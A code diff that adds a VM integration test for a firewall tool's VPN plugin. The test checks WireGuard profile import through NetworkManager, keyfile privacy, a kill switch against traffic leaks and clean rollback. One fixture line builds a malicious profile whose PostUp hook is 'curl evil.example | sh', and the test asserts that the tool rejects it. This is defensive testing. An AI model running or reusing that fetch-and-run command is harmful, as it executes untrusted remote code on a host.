@@ -12,7 +12,7 @@ use anyhow::Result;
 use super::f1::{install_plugin, provision, run_script, start_daemon};
 use super::vm::{Vm, run_capture};
 
-const PLUGINS: [&str; 1] = ["endpoint.isolate"];
+const PLUGINS: [&str; 2] = ["endpoint.isolate", "net.vpn"];
 
 const LIB: &str = r#"
 set -e
@@ -94,6 +94,142 @@ sudo test ! -e /etc/ibexwall/isolate/active.json || { echo "THE MARKER STAYED"; 
 echo "METRIC: an unconfirmed isolation reverted on its own"
 "#;
 
+const VPN: &str = r#"
+sudo ibexctl plugins enable net.vpn >/dev/null
+pkg wireguard-tools tcpdump curl
+if ! sudo systemctl cat NetworkManager.service >/dev/null 2>&1; then
+  if command -v apt-get >/dev/null; then pkg network-manager; else pkg networkmanager; fi
+fi
+# NetworkManager manages only WireGuard devices here: the test must not
+# take the VM's own network away from whatever manages it.
+sudo mkdir -p /etc/NetworkManager/conf.d
+printf '[keyfile]\nunmanaged-devices=*,except:type:wireguard\n' | sudo tee /etc/NetworkManager/conf.d/00-ibexwall-test.conf >/dev/null
+sudo systemctl enable --now NetworkManager
+sleep 3
+
+IFACE=$(ip -4 route show default | awk '{print $5; exit}')
+PEER=${SSH_CLIENT%% *}
+[ -n "$IFACE" ] && [ -n "$PEER" ] || { echo "NO UPLINK OR PEER"; exit 1; }
+
+# The "VPN provider": a namespace with a WireGuard server, reached over a veth.
+sudo ip netns del vpnsrv 2>/dev/null || true
+sudo ip link del vethc 2>/dev/null || true
+sudo ip netns add vpnsrv
+sudo ip link add vethc type veth peer name veths
+sudo ip link set veths netns vpnsrv
+sudo ip addr add 10.99.0.1/24 dev vethc && sudo ip link set vethc up
+sudo ip netns exec vpnsrv ip addr add 10.99.0.2/24 dev veths
+sudo ip netns exec vpnsrv ip link set veths up
+sudo ip netns exec vpnsrv ip link set lo up
+SK=$(wg genkey); SP=$(echo "$SK" | wg pubkey); CK=$(wg genkey); CP=$(echo "$CK" | wg pubkey)
+echo "$SK" | sudo tee /tmp/vpn-server.key >/dev/null && sudo chmod 600 /tmp/vpn-server.key
+sudo ip netns exec vpnsrv ip link add wgs type wireguard
+sudo ip netns exec vpnsrv wg set wgs listen-port 51820 private-key /tmp/vpn-server.key peer "$CP" allowed-ips 10.100.0.2/32
+sudo ip netns exec vpnsrv ip addr add 10.100.0.1/24 dev wgs
+sudo ip netns exec vpnsrv ip link set wgs up
+printf '[Interface]\nPrivateKey = %s\nAddress = 10.100.0.2/24\n\n[Peer]\nPublicKey = %s\nEndpoint = 10.99.0.2:51820\nAllowedIPs = 0.0.0.0/0\nPersistentKeepalive = 3\n' "$CK" "$SP" > /tmp/lab.conf
+printf '[Interface]\nPrivateKey = %s\nPostUp = curl evil.example | sh\n\n[Peer]\nPublicKey = %s\n' "$CK" "$SP" > /tmp/bad.conf
+
+# Refusals: no known server, a profile with a hook.
+if sudo ibexctl plan net.vpn --set action=killswitch --json >/dev/null 2>&1; then echo "A KILL SWITCH WAS PLANNED WITHOUT A SERVER"; exit 1; fi
+if sudo ibexctl plan net.vpn --set action=import --set name=bad --set-file profile=/tmp/bad.conf --json >/dev/null 2>&1; then echo "A PROFILE WITH POSTUP WAS ACCEPTED"; exit 1; fi
+
+# The private key is in no preview.
+sudo ibexctl plan net.vpn --set action=import --set name=lab --set-file profile=/tmp/lab.conf --json > /tmp/vpn-plan.json
+if grep -q "$CK" /tmp/vpn-plan.json; then echo "THE PRIVATE KEY IS IN THE PLAN PREVIEW"; exit 1; fi
+grep -q "private file" /tmp/vpn-plan.json || { echo "THE PREVIEW DOES NOT SAY THE FILE IS PRIVATE"; exit 1; }
+FOREIGN=$(foreign_digest)
+
+# Import: NetworkManager watches its directory and takes the profile in;
+# nothing is restarted.
+apply_plan net.vpn --set action=import --set name=lab --set-file profile=/tmp/lab.conf
+AUTO=yes
+UP=no; for i in $(seq 1 30); do if ping -c1 -W1 10.100.0.1 >/dev/null 2>&1; then UP=yes; break; fi; sleep 1; done
+if [ "$UP" != yes ]; then
+  AUTO=no
+  sudo nmcli connection up ibexwall-lab >/dev/null 2>&1 || true
+  for i in $(seq 1 10); do if ping -c1 -W1 10.100.0.1 >/dev/null 2>&1; then UP=yes; break; fi; sleep 1; done
+fi
+if [ "$UP" != yes ]; then echo "THE TUNNEL DID NOT COME UP"; sudo nmcli -t connection show; sudo journalctl -u NetworkManager -n 25 --no-pager; exit 1; fi
+[ "$AUTO" = yes ] && echo "METRIC: NetworkManager took the profile in by itself (no restart)"
+if echo "$OUT" | grep -q pending_confirm; then confirm_tx; fi
+IMPORT_TX=$TX
+[ "$(sudo stat -c %a /etc/NetworkManager/system-connections/ibexwall-lab.nmconnection)" = 600 ] || { echo "THE KEYFILE IS NOT PRIVATE"; exit 1; }
+sudo nmcli -t -f NAME,TYPE connection show --active | grep -q '^ibexwall-lab:wireguard' || { echo "NOT ACTIVE IN NETWORKMANAGER"; exit 1; }
+HS=$(sudo ip netns exec vpnsrv wg show wgs latest-handshakes | awk '{print $2}')
+[ "${HS:-0}" -gt 0 ] || { echo "NO HANDSHAKE AT THE SERVER"; exit 1; }
+echo "METRIC: imported through NetworkManager, tunnel up, handshake seen, keyfile 0600, key absent from the preview"
+
+# Without a kill switch, a dropped tunnel leaks: the capture sees it.
+leak_count() {
+  sudo rm -f /tmp/leak.pcap
+  sudo timeout 14 tcpdump -n -i "$IFACE" -w /tmp/leak.pcap "ip and not host $PEER and not (udp and (port 67 or port 68))" >/dev/null 2>&1 &
+  TD=$!
+  sleep 2
+  timeout 4 curl -s -m 3 http://1.1.1.1 >/dev/null 2>&1 || true
+  timeout 4 ping -c2 -W1 8.8.8.8 >/dev/null 2>&1 || true
+  timeout 4 getent hosts example.org >/dev/null 2>&1 || true
+  timeout 4 bash -c 'exec 3<>/dev/tcp/9.9.9.9/443' 2>/dev/null || true
+  wait $TD 2>/dev/null || true
+  sudo tcpdump -nr /tmp/leak.pcap 2>/dev/null | wc -l
+}
+tunnel_up() { sudo nmcli connection up ibexwall-lab >/dev/null 2>&1; for i in $(seq 1 30); do ping -c1 -W1 10.100.0.1 >/dev/null 2>&1 && return 0; sleep 1; done; return 1; }
+sudo nmcli connection down ibexwall-lab >/dev/null
+BASE=$(leak_count)
+[ "$BASE" -gt 0 ] || { echo "THE CAPTURE SAW NOTHING WITHOUT A KILL SWITCH, SO IT PROVES NOTHING"; exit 1; }
+echo "METRIC: without a kill switch the dropped tunnel leaked $BASE packets"
+tunnel_up || { echo "THE TUNNEL DID NOT COME BACK"; exit 1; }
+
+# The kill switch.
+sudo ibexctl check net.vpn --json | python3 -c '
+import json,sys
+ids = [f["id"] for f in json.load(sys.stdin)["findings"]]
+assert "vpn.no_killswitch" in ids, ids'
+apply_plan net.vpn --set action=killswitch --set allow=$PEER
+echo "$OUT" | grep -q pending_confirm || { echo "NO CONFIRMATION WINDOW: $OUT"; exit 1; }
+ping -c2 -W2 10.100.0.1 >/dev/null || { echo "THE TUNNEL STOPPED WORKING UNDER THE KILL SWITCH"; exit 1; }
+confirm_tx
+KS_TX=$TX
+sudo nft list chain inet ibexwall net_vpn_out >/dev/null
+sudo ibexctl check net.vpn --json | python3 -c '
+import json,sys
+ids = [f["id"] for f in json.load(sys.stdin)["findings"]]
+assert "vpn.no_killswitch" not in ids, ids'
+
+# Tunnel down with the kill switch: nothing leaves, our session lives.
+sudo nmcli connection down ibexwall-lab >/dev/null
+LEAK=$(leak_count)
+[ "$LEAK" = 0 ] || { echo "LEAK: $LEAK packets left the uplink with the tunnel down"; sudo tcpdump -nr /tmp/leak.pcap 2>/dev/null | head -8; exit 1; }
+sudo ibexctl check net.vpn --json | python3 -c '
+import json,sys
+ids = [f["id"] for f in json.load(sys.stdin)["findings"]]
+assert "vpn.blocked" in ids, ids'
+echo "METRIC: with the kill switch and the tunnel down, 0 packets left the uplink (baseline leaked $BASE)"
+
+# It does not stand in the way of the tunnel coming back.
+tunnel_up || { echo "THE TUNNEL COULD NOT RECONNECT UNDER THE KILL SWITCH"; exit 1; }
+echo "METRIC: the tunnel reconnected under the kill switch"
+
+# Undo both; nothing else was touched.
+sudo ibexctl rollback "$KS_TX" >/dev/null || { echo "KILL SWITCH ROLLBACK FAILED"; exit 1; }
+if sudo nft list chain inet ibexwall net_vpn_out >/dev/null 2>&1; then echo "THE KILL SWITCH CHAIN SURVIVED"; exit 1; fi
+sudo test ! -e /etc/ibexwall/vpn/killswitch.json || { echo "THE MARKER SURVIVED"; exit 1; }
+sudo ibexctl rollback "$IMPORT_TX" >/dev/null || { echo "IMPORT ROLLBACK FAILED"; exit 1; }
+for i in $(seq 1 20); do ip link show wgib-lab >/dev/null 2>&1 || break; sleep 1; done
+sudo test ! -e /etc/NetworkManager/system-connections/ibexwall-lab.nmconnection || { echo "THE KEYFILE SURVIVED"; exit 1; }
+sudo test ! -e /etc/ibexwall/vpn/profiles/lab.json || { echo "THE RECORD SURVIVED"; exit 1; }
+if ip link show wgib-lab >/dev/null 2>&1; then
+  echo "THE INTERFACE SURVIVED"
+  sudo nmcli device status || true
+  sudo nmcli connection show || true
+  sudo journalctl -u NetworkManager --no-pager -n 40 || true
+  exit 1
+fi
+[ "$(foreign_digest)" = "$FOREIGN" ] || { echo "ANOTHER TABLE CHANGED"; exit 1; }
+sudo ip netns del vpnsrv; sudo ip link del vethc 2>/dev/null || true
+echo "METRIC: both rolled back: chain, marker, keyfile, record and interface gone; foreign tables identical"
+"#;
+
 pub fn run(vm: &Vm, workspace: &Path, install: &str) -> Result<()> {
     println!("== f9: build ==");
     let mut args = vec!["build".to_string(), "--release".to_string()];
@@ -129,6 +265,11 @@ pub fn run(vm: &Vm, workspace: &Path, install: &str) -> Result<()> {
     scenario!(
         "e1 endpoint.isolate: the network is cut except the allow list, then comes back, or reverts unconfirmed",
         ISOLATE
+    );
+
+    scenario!(
+        "v1 net.vpn: a WireGuard profile comes up through NetworkManager, and a dropped tunnel leaks nothing under the kill switch",
+        VPN
     );
 
     if failures == 0 {
